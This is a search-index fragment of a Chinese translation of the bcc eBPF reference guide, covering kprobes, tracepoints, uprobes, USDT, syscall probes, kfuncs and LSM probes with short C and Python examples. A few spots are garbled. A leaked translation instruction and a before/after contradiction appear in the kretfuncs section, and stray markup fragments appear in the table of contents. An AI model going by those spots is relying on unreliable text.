CONFIG_MMU MMU-based virtualised addressing space support by paged memory management Tracepoints CONFIG_TRACEPOINTS Enable inserting tracepoints in the kernel and connect to proble functions CONFIG_HAVE_SYSCALL_TRACEPOINTS Enable syscall enter/exit tracing Raw Tracepoints Same as Tracepoints LSM CONFIG_BPF_LSM Enable instrumentation of the security hooks with BPF programs for implementing dynamic MAC and Audit Policies LIRC CONFIG_BPF_LIRC_MODE2 Allow attaching BPF programs to a lirc device <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/reference_guide/","title":"bcc \u53c2\u8003\u6307\u5357","text":"<p>\u7528\u4e8e\u641c\u7d22 (Ctrl-F) \u548c\u53c2\u8003\u3002\u5982\u9700\u6559\u7a0b\uff0c\u8bf7\u4ece tutorial.md \u5f00\u59cb\u3002</p> <p>\u8be5\u6307\u5357\u5c1a\u672a\u5b8c\u6210\u3002\u5982\u679c\u611f\u89c9\u6709\u9057\u6f0f\u7684\u5185\u5bb9\uff0c\u8bf7\u67e5\u770b bcc \u548c\u5185\u6838\u6e90\u7801\u3002\u5982\u679c\u786e\u8ba4\u786e\u5b9e\u6709\u9057\u6f0f\uff0c\u8bf7\u53d1\u9001\u62c9\u53d6\u8bf7\u6c42\u8fdb\u884c\u4fee\u590d\uff0c\u5e76\u534f\u52a9\u6240\u6709\u4eba\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_1","title":"\u76ee\u5f55","text":"<ul> <li>bcc \u53c2\u8003\u6307\u5357</li> <li>\u76ee\u5f55</li> <li>BPF C</li> <li>Events \\&amp; Arguments<ul> <li>1. kprobes</li> <li>2. kretprobes</li> <li>3. Tracepoints</li> <li>4. uprobes</li> <li>6. USDT\u63a2\u6d4b\u70b9</li> <li>7. \u539f\u59cb\u8ddf\u8e2a\u70b9</li> <li>8. \u7cfb\u7edf\u8c03\u7528\u8ddf\u8e2a\u70b9</li> <li>9. kfuncs</li> <li>10. kretfuncs</li> <li>11. LSM Probes</li> <li>12. BPF\u8fed\u4ee3\u5668</li> </ul> </li> <li>\u6570\u636e<ul> <li>1. bpf_probe_read_kernel()</li> <li>2. bpf_probe_read_kernel_str()\".```shell</li> <li>3. bpf_ktime_get_ns()</li> <li>4. bpf_get_current_pid_tgid()</li> <li>5. bpf_get_current_uid_gid()</li> <li>6. bpf_get_current_comm()</li> <li>7. bpf_get_current_task()</li> <li>8. bpf_log2l()</li> <li>9. bpf_get_prandom_u32()</li> <li>10. bpf_probe_read_user()</li> <li>11. bpf_probe_read_user_str()</li> <li>12. bpf_get_ns_current_pid_tgid()</li> </ul> </li> <li>\u8c03\u8bd5<ul> <li>1. bpf_override_return()</li> </ul> </li> <li>\u8f93\u51fa<ul> <li>1. bpf_trace_printk()</li> <li>2. BPF_PERF_OUTPUT</li> <li>3. perf_submit()</li> <li>4. perf_submit_skb()</li> <li>5. BPF_RINGBUF_OUTPUT</li> <li>6. ringbuf_output\uff08\uff09</li> <li>7. ringbuf_reserve()</li> <li>8. ringbuf_submit\uff08\uff09</li> <li>9. ringbuf_discard()</li> </ul> </li> <li>Maps<ul> <li>1. BPF_TABLE</li> <li>\u56fa\u5b9a\u6620\u5c04</li> <li>2. BPF_HASH</li> <li>3. BPF_ARRAY</li> <li>4. BPF_HISTOGRAM</li> <li>5. BPF_STACK_TRACE</li> <li>6. BPF_PERF_ARRAY</li> <li>7. BPF_PERCPU_HASH</li> <li>8. BPF_PERCPU_ARRAY</li> <li>9. BPF_LPM_TRIE</li> <li>10. BPF_PROG_ARRAY</li> <li>11. BPF_DEVMAP</li> <li>12. BPF_CPUMAP</li> <li>13. BPF_XSKMAP</li> <li>14. BPF_ARRAY_OF_MAPS</li> <li>15. BPF_HASH_OF_MAPS</li> <li>16. BPF_STACK</li> <li>17. BPF_QUEUE</li> <li>18. BPF_SOCKHASH</li> <li>19. map.lookup()</li> <li>20. map.lookup_or_try_init()</li> <li>21. map.delete()</li> <li>22. map.update()</li> <li>23. map.insert()</li> <li>24. map.increment()</li> <li>25. map.get_stackid()</li> <li>26. map.perf_read()</li> <li>27. map.call()</li> <li>28. map.redirect_map()</li> <li>29. map.push()</li> <li>30. map.pop()</li> <li>31. map.peek()</li> <li>32. map.sock_hash_update()</li> <li>33. map.msg_redirect_hash()</li> <li>34. map.sk_redirect_hash()</li> </ul> </li> <li>\u8bb8\u53ef\u8bc1</li> <li>Rewriter</li> <li>bcc Python</li> <li>\u521d\u59cb\u5316<ul> <li>1. BPF</li> </ul> </li> <li>\u4e8b\u4ef6<ul> <li>1. attach_kprobe()</li> <li>2. attach_kretprobe()</li> <li>3. attach_tracepoint()</li> <li>4. attach_uprobe()</li> <li>5. attach_uretprobe()</li> <li>6. USDT.enable_probe()</li> <li>7. attach_raw_tracepoint()</li> <li>8. attach_raw_socket()</li> <li>9. attach_xdp()</li> <li>1. XDP_FLAGS_UPDATE_IF_NOEXIST</li> <li>2. XDP_FLAGS_SKB_MODE</li> <li>3. XDP_FLAGS_DRV_MODE</li> <li>4. XDP_FLAGS_HW_MODE</li> <li>10. attach_func()</li> <li>12. detach_kprobe()</li> <li>13. detach_kretprobe()</li> </ul> </li> <li>\u8c03\u8bd5\u8f93\u51fa<ul> <li>1. trace_print()</li> <li>2. trace_fields()</li> </ul> </li> <li>\u8f93\u51fa API<ul> <li>1. perf_buffer_poll()</li> <li>2. ring_buffer_poll()</li> <li>3. ring_buffer_consume()</li> </ul> </li> <li>Map APIs<ul> <li>1. get_table()</li> <li>2. open_perf_buffer()</li> <li>4. values()</li> <li>5. clear()</li> <li>6. items_lookup_and_delete_batch()</li> <li>7. items_lookup_batch()</li> <li>8. items_delete_batch()</li> <li>9. items_update_batch()</li> <li>11. print_linear_hist()\".\u8bed\u6cd5: <code>table.print_linear_hist(val_type=\"value\", section_header=\"Bucket ptr\", section_print_fn=None)</code></li> <li>12. open_ring_buffer()</li> <li>13. push()</li> <li>14. pop()</li> <li>15. peek()</li> </ul> </li> <li>\u8f85\u52a9\u65b9\u6cd5<ul> <li>1. ksym()</li> <li>2. ksymname()</li> <li>3. sym()</li> <li>4. num_open_kprobes()</li> <li>5. get_syscall_fnname()</li> </ul> </li> <li>BPF \u9519\u8bef</li> <li>1. Invalid mem access</li> <li>2. \u65e0\u6cd5\u4ece\u4e13\u6709\u7a0b\u5e8f\u8c03\u7528 GPL-only \u51fd\u6570</li> <li>\u73af\u5883\u53d8\u91cf</li> <li>1. \u5185\u6838\u6e90\u4ee3\u7801\u76ee\u5f55</li> <li>2. \u5185\u6838\u7248\u672c\u8986\u76d6</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide/#bpf-c","title":"BPF C","text":"<p>\u672c\u8282\u4ecb\u7ecd\u4e86 bcc \u7a0b\u5e8f\u7684 C \u90e8\u5206\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#events-arguments","title":"Events &amp; Arguments","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-kprobes","title":"1. kprobes","text":"<p>\u8bed\u6cd5\uff1akprobe__kernel_function_name</p> <p><code>kprobe__</code> \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u524d\u7f00\uff0c\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a kprobe\uff08\u5bf9\u5185\u6838\u51fd\u6570\u8c03\u7528\u7684\u52a8\u6001\u8ddf\u8e2a\uff09\uff0c\u540e\u9762\u8ddf\u7740\u7684\u662f\u5185\u6838\u51fd\u6570\u7684\u540d\u79f0\u3002\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u7684 C \u51fd\u6570\uff0c\u7136\u540e\u4f7f\u7528 Python \u7684 <code>BPF.attach_kprobe()</code>\uff08\u7a0d\u540e\u4f1a\u4ecb\u7ecd\uff09\u5c06\u5176\u4e0e\u4e00\u4e2a\u5185\u6838\u51fd\u6570\u5173\u8054\u8d77\u6765\u6765\u4f7f\u7528 kprobe\u3002</p> <p>\u53c2\u6570\u5728\u51fd\u6570\u58f0\u660e\u4e2d\u6307\u5b9a\uff1akprobe__kernel_function_name(struct pt_regs ctx [, argument1* ...])</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>int kprobe__tcp_v4_connect(struct pt_regs *ctx, struct sock *sk) {\n    [...]\n}\n</code></pre> <p>\u8fd9\u4f1a\u4f7f\u7528 kprobe \u5bf9 tcp_v4_connect() \u5185\u6838\u51fd\u6570\u8fdb\u884c\u63d2\u88c5\uff0c\u5e76\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\uff1a</p> <ul> <li><code>struct pt_regs *ctx</code>: \u5bc4\u5b58\u5668\u548c BPF \u4e0a\u4e0b\u6587\u3002</li> <li><code>struct sock *sk</code>: tcp_v4_connect() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002</li> </ul> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u59cb\u7ec8\u662f <code>struct pt_regs *</code>\uff0c\u5176\u4f59\u7684\u662f\u51fd\u6570\u7684\u53c2\u6570\uff08\u5982\u679c\u4f60\u4e0d\u6253\u7b97\u4f7f\u7528\u5b83\u4eec\uff0c\u5219\u4e0d\u9700\u8981\u6307\u5b9a\uff09\u3002</p> <p>\u793a\u4f8b\u4ee3\u7801\uff1a code\uff08\u8f93\u51fa\u7ed3\u679c),\".\"code \uff08output)</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-kretprobes","title":"2. kretprobes","text":"<p>\u8bed\u6cd5: kretprobe__kernel_function_name</p> <p><code>kretprobe__</code>\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u524d\u7f00\uff0c\u5b83\u521b\u5efa\u4e86\u4e00\u4e2akretprobe\uff08\u5bf9\u63d0\u4f9b\u7684\u5185\u6838\u51fd\u6570\u540d\u8fdb\u884c\u52a8\u6001\u8ffd\u8e2a\uff0c\u8ddf\u8e2a\u5185\u6838\u51fd\u6570\u7684\u8fd4\u56de\uff09\u3002\u60a8\u4e5f\u53ef\u4ee5\u901a\u8fc7\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u7684C\u51fd\u6570\uff0c\u7136\u540e\u4f7f\u7528Python\u7684<code>BPF.attach_kretprobe()</code>\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\u5c06\u5176\u4e0e\u5185\u6838\u51fd\u6570\u5173\u8054\u8d77\u6765\uff0c\u6765\u4f7f\u7528kretprobes\u3002</p> <p>\u8fd4\u56de\u503c\u53ef\u7528\u4f5c<code>PT_REGS_RC(ctx)</code>\uff0c\u7ed9\u5b9a\u51fd\u6570\u58f0\u660e\u4e3a\uff1akretprobe__kernel_function_name(struct pt_regs *ctx)</p> <p>\u4f8b\u5982:</p> <pre><code>int kretprobe__tcp_v4_connect(struct pt_regs *ctx)\n{\n    int ret = PT_REGS_RC(ctx);\n    [...]\n}\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u4f7f\u7528kretprobe\u6765\u5bf9tcp_v4_connect()\u5185\u6838\u51fd\u6570\u7684\u8fd4\u56de\u8fdb\u884c\u68c0\u6d4b\uff0c\u5e76\u5c06\u8fd4\u56de\u503c\u5b58\u50a8\u5728<code>ret</code>\u4e2d\u3002</p> <p>\u73b0\u6709\u7684\u7528\u6cd5\u793a\u4f8b: code \uff08output)</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-tracepoints","title":"3. Tracepoints","text":"<p>\u8bed\u6cd5: TRACEPOINT_PROBE(category, event)</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5b8f\uff0c\u7528\u4e8e\u5bf9\u7531category:event\u5b9a\u4e49\u7684tracepoint\u8fdb\u884c\u8ffd\u8e2a\u3002</p> <p>tracepoint\u540d\u79f0\u4e3a<code>&lt;category&gt;:&lt;event&gt;</code>\u3002 probe\u51fd\u6570\u540d\u4e3a<code>tracepoint__&lt;category&gt;__&lt;event&gt;</code>\u3002</p> <p>\u53c2\u6570\u5728\u4e00\u4e2a<code>args</code>\u7ed3\u6784\u4f53\u4e2d\u53ef\u7528\uff0c\u8fd9\u4e9b\u53c2\u6570\u662ftracepoint\u7684\u53c2\u6570\u3002\u5217\u51fa\u8fd9\u4e9b\u53c2\u6570\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u5728/sys/kernel/debug/tracing/events/category/event/format\u4e0b\u67e5\u770b\u76f8\u5173\u7684\u683c\u5f0f\u6587\u4ef6\u3002\"<code>args</code> \u7ed3\u6784\u4f53\u53ef\u7528\u4e8e\u66ff\u4ee3 <code>ctx</code>\uff0c\u4f5c\u4e3a\u9700\u8981\u4e0a\u4e0b\u6587\u4f5c\u4e3a\u53c2\u6570\u7684\u6bcf\u4e2a\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u3002\u8fd9\u5305\u62ec\u7279\u522b\u662f perf_submit()\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>TRACEPOINT_PROBE(random, urandom_read) {\n    // args is from /sys/kernel/debug/tracing/events/random/urandom_read/format\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n}\n</code></pre> <p>\u8fd9\u4f1a\u7ed9 <code>random:urandom_read</code> \u8ffd\u8e2a\u70b9\u6ce8\u5165\u4ee3\u7801\uff0c\u5e76\u6253\u5370\u51fa\u8ffd\u8e2a\u70b9\u53c2\u6570 <code>got_bits</code>\u3002 \u5728\u4f7f\u7528 Python API \u65f6\uff0c\u6b64\u63a2\u9488\u4f1a\u81ea\u52a8\u9644\u52a0\u5230\u6b63\u786e\u7684\u8ffd\u8e2a\u70b9\u76ee\u6807\u4e0a\u3002 \u5bf9\u4e8e C++\uff0c\u53ef\u4ee5\u901a\u8fc7\u660e\u786e\u6307\u5b9a\u8ffd\u8e2a\u70b9\u76ee\u6807\u548c\u51fd\u6570\u540d\u6765\u9644\u52a0\u6b64\u8ffd\u8e2a\u70b9\u63a2\u9488\uff1a <code>BPF::attach_tracepoint(\"random:urandom_read\", \"tracepoint__random__urandom_read\")</code> \u6ce8\u610f\uff0c\u4e0a\u9762\u5b9a\u4e49\u7684\u63a2\u9488\u51fd\u6570\u7684\u540d\u79f0\u662f <code>tracepoint__random__urandom_read</code>\u3002</p> <p>\u5b9e\u9645\u793a\u4f8b\uff1a code (output)\uff0c search /examples\uff0c search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-uprobes","title":"4. uprobes","text":"<p>\u8fd9\u4e9b\u662f\u901a\u8fc7\u5728 C \u4e2d\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u7136\u540e\u5728 Python \u4e2d\u901a\u8fc7 <code>BPF.attach_uprobe()</code> \u5c06\u5176\u5173\u8054\u4e3a uprobes \u63a2\u9488\u6765\u8fdb\u884c\u6ce8\u5165\u7684\uff08\u7a0d\u540e\u4f1a\u4ecb\u7ecd\uff09\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>PT_REGS_PARM</code> \u5b8f\u6765\u68c0\u67e5\u53c2\u6570\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>int count(struct pt_regs *ctx) {\n    char buf[64];\n    bpf_probe_read_user(&amp;buf, sizeof(buf), (void *)PT_REGS_PARM1(ctx));\n    bpf_trace_printk(\"%s %d\", buf, PT_REGS_PARM2(ctx));\n    return(0);\n}\n</code></pre> <p>\u8fd9\u5c06\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f5c\u4e3a\u6574\u6570\u6253\u5370\u51fa\u6765\u3002</p> <p>\u5b9e\u9645\u793a\u4f8b\uff1a code\u3002### 5\u3002uretprobes</p> <p>\u8fd9\u4e9b\u662f\u901a\u8fc7\u5728C\u4e2d\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u7136\u540e\u5728Python\u4e2d\u901a\u8fc7<code>BPF.attach_uretprobe()</code>\u5c06\u5176\u5173\u8054\u4e3auretprobe\u63a2\u6d4b\u70b9\uff08\u7a0d\u540e\u8be6\u8ff0\uff09\u6765\u8fdb\u884c\u63d2\u88c5\u7684\u3002</p> <p>\u8fd4\u56de\u503c\u53ef\u4ee5\u901a\u8fc7<code>PT_REGS_RC(ctx)</code>\u8bbf\u95ee\uff0c\u524d\u63d0\u662f\u6709\u4e00\u4e2a\u5982\u4e0b\u58f0\u660e\u7684\u51fd\u6570\uff1afunction_name(struct pt_regs *ctx)</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_HISTOGRAM(dist);\nint count(struct pt_regs *ctx) {\n    dist.increment(PT_REGS_RC(ctx));\n    return 0;\n}\n</code></pre> <p>\u8fd9\u4f1a\u9012\u589e\u7531\u8fd4\u56de\u503c\u7d22\u5f15\u7684<code>dist</code>\u76f4\u65b9\u56fe\u4e2d\u7684\u5b58\u50a8\u6876\u3002</p> <p>\u73b0\u573a\u6f14\u793a\u793a\u4f8b\uff1a code (output), code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-usdt","title":"6. USDT\u63a2\u6d4b\u70b9","text":"<p>\u8fd9\u4e9b\u662f\u7528\u6237\u9759\u6001\u5b9a\u4e49\u8ffd\u8e2a\uff08USDT\uff09\u63a2\u6d4b\u70b9\uff0c\u53ef\u4ee5\u653e\u7f6e\u5728\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u6216\u5e93\u4e2d\uff0c\u4ee5\u63d0\u4f9b\u7528\u6237\u7ea7\u522b\u7b49\u6548\u7684\u8ddf\u8e2a\u70b9\u3002\u7528\u4e8eUSDT\u652f\u6301\u7684\u4e3b\u8981BPF\u65b9\u6cd5\u662f<code>enable_probe()</code>\u3002\u901a\u8fc7\u5728C\u4e2d\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u7136\u540e\u5728Python\u4e2d\u901a\u8fc7<code>USDT.enable_probe()</code>\u5c06\u5176\u5173\u8054\u4e3aUSDT\u63a2\u6d4b\u70b9\u6765\u8fdb\u884c\u63d2\u88c5\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8bfb\u53d6\u53c2\u6570\uff1abpf_usdt_readarg(index, ctx, &amp;addr)</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>int do_trace(struct pt_regs *ctx) {\n    uint64_t addr;\n    char path[128];\n    bpf_usdt_readarg(6, ctx, &amp;addr);\n    bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr);\n    bpf_trace_printk(\"path:%s\\\\n\", path);\n    return 0;\n};\n</code></pre> <p>\u8fd9\u4f1a\u8bfb\u53d6\u7b2c\u516d\u4e2aUSDT\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5176\u4f5c\u4e3a\u5b57\u7b26\u4e32\u5b58\u50a8\u5230<code>path</code>\u4e2d\u3002\u5f53\u4f7f\u7528C API\u4e2d\u7684<code>BPF::init</code>\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u8fdb\u884cUSDT\u7684\u521d\u59cb\u5316\u65f6\uff0c\u5982\u679c\u4efb\u4f55USDT\u65e0\u6cd5\u8fdb\u884c<code>init</code>\uff0c\u5219\u6574\u4e2a<code>BPF::init</code>\u90fd\u4f1a\u5931\u8d25\u3002\u5982\u679c\u60a8\u5bf9\u4e00\u4e9bUSDT\u65e0\u6cd5\u8fdb\u884c<code>init</code>\u611f\u5230\u6ee1\u610f\uff0c\u5219\u5728\u8c03\u7528<code>BPF::init</code>\u4e4b\u524d\u4f7f\u7528<code>BPF::init_usdt</code>\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#7","title":"7. \u539f\u59cb\u8ddf\u8e2a\u70b9","text":"<p>\u8bed\u6cd5\uff1aRAW_TRACEPOINT_PROBE(event)</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5b8f\uff0c\u7528\u4e8e\u4eea\u8868\u5316\u7531event\u5b9a\u4e49\u7684\u539f\u59cb\u8ddf\u8e2a\u70b9\u3002</p> <p>\u8be5\u53c2\u6570\u662f\u6307\u5411\u7ed3\u6784\u4f53<code>bpf_raw_tracepoint_args</code>\u7684\u6307\u9488\uff0c\u8be5\u7ed3\u6784\u4f53\u5b9a\u4e49\u5728bpf.h\u4e2d\u3002\u7ed3\u6784\u4f53\u5b57\u6bb5<code>args</code>\u5305\u542b\u4e86\u539f\u59cb\u8ddf\u8e2a\u70b9\u7684\u6240\u6709\u53c2\u6570\uff0c\u53ef\u4ee5\u5728include/trace/events\u76ee\u5f55\u4e2d\u627e\u5230\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>RAW_TRACEPOINT_PROBE(sched_switch)\n{\n    // TP_PROTO(bool preempt, struct task_struct *prev, struct task_struct *next)\n    struct task_struct *prev = (struct task_struct *)ctx-&gt;args[1];\n    struct task_struct *next= (struct task_struct *)ctx-&gt;args[2];\n    s32 prev_tgid, next_tgid;\n\n    bpf_probe_read_kernel(&amp;prev_tgid, sizeof(prev-&gt;tgid), &amp;prev-&gt;tgid);\n    bpf_probe_read_kernel(&amp;next_tgid, sizeof(next-&gt;tgid), &amp;next-&gt;tgid);\n    bpf_trace_printk(\"%d -&gt; %d\\\\n\", prev_tgid, next_tgid);\n}\n</code></pre> <p>\u8fd9\u5c06\u4eea\u8868\u5316sched:sched_switch\u8ddf\u8e2a\u70b9\uff0c\u5e76\u6253\u5370prev\u548cnext tgid\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#8","title":"8. \u7cfb\u7edf\u8c03\u7528\u8ddf\u8e2a\u70b9","text":"<p>\u8bed\u6cd5\uff1a<code>syscall__SYSCALLNAME</code>\u3002<code>syscall__</code>\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u524d\u7f00\uff0c\u7528\u4e8e\u4e3a\u63d0\u4f9b\u7684\u7cfb\u7edf\u8c03\u7528\u540d\u79f0\u521b\u5efa\u4e00\u4e2akprobe\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u58f0\u660e\u4e00\u4e2a\u666e\u901a\u7684C\u51fd\u6570\uff0c\u7136\u540e\u4f7f\u7528Python\u7684<code>BPF.get_syscall_fnname(SYSCALLNAME)</code>\u548c<code>BPF.attach_kprobe()</code>\u6765\u4f7f\u7528\u5b83\u3002</p> <p>\u53c2\u6570\u5728\u51fd\u6570\u58f0\u660e\u4e2d\u6307\u5b9a: <code>syscall__SYSCALLNAME(struct pt_regs *ctx, [, argument1 ...])</code>.</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>int syscall__execve(struct pt_regs *ctx,\n    const char __user *filename,\n    const char __user *const __user *__argv,\n    const char __user *const __user *__envp)\n{\n    [...]\n}\n</code></pre> <p>\u8fd9\u5c06\u5bf9execve\u7cfb\u7edf\u8c03\u7528\u8fdb\u884c\u63a2\u67e5\u3002</p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u59cb\u7ec8\u662f<code>struct pt_regs *</code>\uff0c\u5176\u4f59\u7684\u53c2\u6570\u662f\u51fd\u6570\u7684\u53c2\u6570\uff08\u5982\u679c\u60a8\u4e0d\u6253\u7b97\u4f7f\u7528\u5b83\u4eec\uff0c\u5219\u65e0\u9700\u6307\u5b9a\uff09\u3002</p> <p>\u76f8\u5e94\u7684Python\u4ee3\u7801\uff1a</p> <pre><code>b = BPF(text=bpf_text)\nexecve_fnname = b.get_syscall_fnname(\"execve\")\nb.attach_kprobe(event=execve_fnname, fn_name=\"syscall__execve\")\n</code></pre> <p>\u793a\u4f8b\uff1a code (output)</p>"},{"location":"tutorials/bcc-documents/reference_guide/#9-kfuncs","title":"9. kfuncs","text":"<p>\u8bed\u6cd5\uff1aKFUNC_PROBE(function, typeof(arg1) arg1, typeof(arg2) arge ...)</p> <p>\u8fd9\u662f\u4e00\u4e2a\u901a\u8fc7\u8df3\u677f\u6765\u5728\u5185\u6838\u51fd\u6570\u6267\u884c\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u63a2\u67e5\u7684\u5b8f\u3002\u5b83\u7531function\u540d\u79f0\u548cargX\u5b9a\u4e49\u7684\u51fd\u6570\u53c2\u6570\u7ec4\u6210\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>KFUNC_PROBE(do_sys_open, int dfd, const char *filename, int flags, int mode)\n{\n    ...\n}\n</code></pre> <p>\u8fd9\u5c06\u5bf9do_sys_open\u5185\u6838\u51fd\u6570\u8fdb\u884c\u63a2\u67e5\uff0c\u5e76\u5c06\u5176\u53c2\u6570\u4f5c\u4e3a\u6807\u51c6\u53c2\u6570\u503c\u8bbf\u95ee\u3002</p> <p>\u793a\u4f8b\uff1a search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#10-kretfuncs","title":"10. kretfuncs","text":"<p>\u8bed\u6cd5\uff1aKRETFUNC_PROBE(event, typeof(arg1) arg1, typeof(arg2) arge ..., int ret)</p> <p>\u8fd9\u662f\u4e00\u4e2a\u901a\u8fc7\u8df3\u677f\u6765\u5728\u5185\u6838\u51fd\u6570\u6267\u884c\u4e4b\u524d\u63a2\u67e5\u7684\u5b8f\u3002 \u683c\u5f0f\uff1a\u4ec5\u8fd4\u56de\u7ffb\u8bd1\u540e\u7684\u5185\u5bb9\uff0c\u4e0d\u5305\u62ec\u539f\u59cb\u6587\u672c\u3002\u5728\u51fd\u6570\u6267\u884c\u4e4b\u540e\u3002\u5b83\u7531\u51fd\u6570\u540d\u79f0\u548c\u5b9a\u4e49\u4e3aargX\u7684\u51fd\u6570\u53c2\u6570\u5b9a\u4e49\u3002</p> <p>\u63a2\u9488\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f\u68c0\u6d4b\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>KRETFUNC_PROBE(do_sys_open, int dfd, const char *filename, int flags, int mode, int ret)\n{\n    ...\n</code></pre> <p>\u8fd9\u4f1a\u5bf9do_sys_open\u5185\u6838\u51fd\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u5e76\u5c06\u5176\u53c2\u6570\u4f5c\u4e3a\u6807\u51c6\u53c2\u6570\u503c\u4e00\u8d77\u4e0e\u5176\u8fd4\u56de\u503c\u4e00\u8d77\u63d0\u53d6\u3002</p> <p>\u539f\u5730\u793a\u4f8b\uff1a \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#11-lsm-probes","title":"11. LSM Probes","text":"<p>\u8bed\u6cd5\uff1aLSM_PROBE(hook, typeof(arg1) arg1, typeof(arg2) arg2 ...)</p> <p>\u8fd9\u662f\u4e00\u79cd\u5c06LSM\u6302\u94a9\u4f5c\u4e3aBPF\u7a0b\u5e8f\u8fdb\u884c\u68c0\u6d4b\u7684\u5b8f\u3002\u5b83\u53ef\u4ee5\u7528\u4e8e\u5ba1\u8ba1\u5b89\u5168\u4e8b\u4ef6\u548c\u5b9e\u65bdBPF\u4e2d\u7684MAC\u5b89\u5168\u7b56\u7565\u3002 \u5b83\u901a\u8fc7\u6307\u5b9a\u6302\u94a9\u540d\u53ca\u5176\u53c2\u6570\u6765\u5b9a\u4e49\u3002</p> <p>\u53ef\u4ee5\u5728 include/linux/security.h \u4e2d\u627e\u5230\u6302\u94a9\u540d\u79f0\uff0c\u65b9\u6cd5\u662f\u53d6security_hookname\u4e4b\u7c7b\u7684\u51fd\u6570\u540d\uff0c\u7136\u540e\u53ea\u4fdd\u7559<code>hookname</code>\u90e8\u5206\u3002 \u4f8b\u5982\uff0c<code>security_bpf</code>\u4ec5\u53d8\u6210\u4e86<code>bpf</code>\u3002</p> <p>\u4e0e\u5176\u4ed6BPF\u7a0b\u5e8f\u7c7b\u578b\u4e0d\u540c\uff0cLSM\u63a2\u9488\u4e2d\u6307\u5b9a\u7684\u8fd4\u56de\u503c\u662f\u5f88\u91cd\u8981\u7684\u3002\u8fd4\u56de\u503c\u4e3a0\u8868\u793a\u6302\u94a9\u6210\u529f\uff0c\u800c \u4efb\u4f55\u975e\u96f6\u7684\u8fd4\u56de\u503c\u90fd\u4f1a\u5bfc\u81f4\u6302\u94a9\u5931\u8d25\u548c\u62d2\u7edd\u5b89\u5168\u64cd\u4f5c\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u5bf9\u4e00\u4e2a\u62d2\u7edd\u6240\u6709\u672a\u6765BPF\u64cd\u4f5c\u7684\u6302\u94a9\u8fdb\u884c\u4e86\u68c0\u6d4b\uff1a</p> <pre><code>LSM_PROBE(bpf, int cmd, union bpf_attr *attr, unsigned int size)\n{\n    return -EPERM;\n}\n</code></pre> <p>\u8fd9\u4f1a\u5bf9<code>security_bpf</code>\u6302\u94a9\u8fdb\u884c\u68c0\u6d4b\uff0c\u5e76\u5bfc\u81f4\u5176\u8fd4\u56de<code>-EPERM</code>\u3002 \u5c06<code>return -EPERM</code>\u66f4\u6539\u4e3a<code>return 0</code>\u4f1a\u5bfc\u81f4BPF\u7a0b\u5e8f\u5141\u8bb8\u8be5\u64cd\u4f5c\u3002</p> <p>LSM\u63a2\u9488\u9700\u8981\u81f3\u5c11\u4e00\u4e2a5.7+\u5185\u6838\uff0c\u5e76\u8bbe\u7f6e\u4e86\u4ee5\u4e0b\u914d\u7f6e\u9009\u9879\uff1a</p> <ul> <li><code>CONFIG_BPF_LSM=y</code></li> <li><code>CONFIG_LSM</code> \u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u5305\u542b\"bpf\"\uff08\u4f8b\u5982\uff0c   <code>CONFIG_LSM=\"lockdown,yama,bpf\"</code>)</li> </ul> 